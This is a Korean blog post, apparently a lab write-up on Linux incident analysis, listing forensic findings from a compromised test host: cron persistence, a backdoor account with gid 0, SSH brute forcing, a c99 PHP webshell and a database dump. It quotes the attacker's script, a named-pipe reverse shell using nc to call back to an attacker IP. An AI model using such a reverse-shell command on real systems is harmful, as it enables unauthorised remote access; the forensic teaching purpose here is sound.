@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+	<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>
+    침해사고분석 - Linux - To be Useful to the World
+    
+  </title>
+
+  <meta name="description" content="Linux Image Dump">
+
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <link rel="stylesheet" href="/assets/vendor/bootstrap/css/bootstrap.min.css">
+
+  <link rel="stylesheet" href="/assets/vendor/fontawesome-free/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:4000/2018/08/07/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DLinux.html">
+  <link rel="alternate" type="application/rss+xml" title="To be Useful to the World" href="/feed.xml">
+
+</head>
+
+	<body>
+		<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  <div class="container">
+    <a class="navbar-brand" href="/">Useworld</a>
+    <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+    Menu
+    <i class="fa fa-bars"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarResponsive">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="/">Home</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/about">About</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/posts">Posts</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/contact">Contact</a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+		<!-- Page Header -->
+
+    <header class="masthead">
+    
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1>침해사고분석 - Linux</h1>
+            
+            <span class="meta">Posted by
+              <a href="#">Useworld</a>
+              on August 07, 2018 &middot; <span class="reading-time" title="Estimated read time">
+  
+   1 min  read </span>
+
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-md-10 mx-auto">
+        <h3 id="linux-image-dump">Linux Image Dump</h3>
+
+<blockquote>
+  <p>ex) dd if=/dev/sda of=/mnt/hgfs/LinuxImage/linux.dd</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="실습">실습</h3>
+
+<blockquote>
+  <p><strong>Victim IP</strong></p>
+
+  <p>192.168.171.188</p>
+
+  <p><strong>Attacker IP</strong></p>
+
+  <p>192.168.171.1, 192.168.171.146, 192.168.171.182</p>
+
+  <p><br /></p>
+
+  <p><strong>crontab</strong></p>
+
+  <p>/tmp/wow64.sh 쉘 스크립트 실행 등록</p>
+
+  <p><br /></p>
+
+  <p><strong>wow64.sh</strong></p>
+
+  <p>#!/bin/bash</p>
+
+  <p>mknod /tmp/backpipe p</p>
+
+  <table>
+    <tbody>
+      <tr>
+        <td>/bin/sh 0&lt;/tmp/backpipe</td>
+        <td>nc 192.168.171.1 5555 1&gt;/tmp/backpipe</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p><br /></p>
+
+  <p><strong>/etc/passwd</strong></p>
+
+  <p>infosechack 계정 root도 아닌데 gid가 0</p>
+
+  <p><br /></p>
+
+  <p><strong>/var/log/auth.log</strong></p>
+
+  <p>Nov 1 21:32:20 192.168.171.146</p>
+
+  <p>ssh brute force attack</p>
+
+  <p>Nov 1 21:41:02 192.168.171.1</p>
+
+  <ol>
+    <li>Windows SSH Client로 SSH 접속</li>
+    <li>root로 로그인 성공</li>
+    <li>infosechack useradd 됨</li>
+    <li>로그아웃 후 infosechack으로 다시 ssh 접속</li>
+  </ol>
+
+  <p><br /></p>
+
+  <p><strong>/var/log/access.log</strong></p>
+
+  <p>Nov 1 21:19:16</p>
+
+  <p>192.168.171.182</p>
+
+  <p>vega 사용(brute force 툴)</p>
+
+  <p>192.168.171.146</p>
+
+  <p>w3af 사용(웹앱 공격 툴)</p>
+
+  <p>/morningmall/m_login_ok.php</p>
+
+  <p>hydra 사용(brute force 툴)</p>
+
+  <p><br /></p>
+
+  <p><strong>/var/log/apache2/access.log</strong></p>
+
+  <p>Nov 1 23:29:02 192.168.171.1</p>
+
+  <p>c99_madnet.php 접근(php webshell)</p>
+
+  <p>코드 난독화</p>
+
+  <p>base64 php decoding</p>
+
+  <p><br /></p>
+
+  <p><strong>/var/www/morningmall/dump_192.168.171.188_mysql_02-11-2014-00-07-10.sql</strong></p>
+
+  <p>2014-11-02 00:07:10</p>
+
+  <p>sql 덤프</p>
+</blockquote>
+
+        
+        
+        <hr>
+        <div class="clearfix">
+          
+            <a class="btn btn-primary float-left" href="/2018/08/02/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DWindows.html" data-toggle="tooltip" data-placement="top" title="침해사고분석 - Windows">&larr; Previous<span class="d-none d-md-inline">
+            Post</span></a>
+          
+          
+            <a class="btn btn-primary float-right" href="/2018/08/09/%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C%EB%B6%84%EC%84%9D.html" data-toggle="tooltip" data-placement="top" title="악성코드 분석">Next<span class="d-none d-md-inline">
+            Post</span> &rarr;</a>
+          
+        </div>
+        <hr>
+        <div id="disqus_thread"></div>
+        <script>
+        /**
+        *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://useworld.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+      </div>
+    </div>
+  </div>
+		<!-- Footer -->
+
+<hr>
+
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-md-10 mx-auto">
+        <ul class="list-inline text-center">
+          
+          <li class="list-inline-item">
+            <a href="mailto:useworld@naver.com">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+          
+          
+          
+          
+          <li class="list-inline-item">
+            <a href="https://github.com/useworld">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+
+          <li class="list-inline-item">
+            <a href="https://open.kakao.com/o/s5bkJP0b">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-comments fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <hr>
+        <p class="copyright text-muted">Copyright &copy; Useworld 2020</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+		<script src="/assets/vendor/jquery/jquery.min.js"></script>
+<script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="/assets/vendor/startbootstrap-clean-blog/js/clean-blog.min.js"></script>
+
+<script src="/assets/scripts.js"></script>
+
+
+
+		<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+	</body>
+</html>
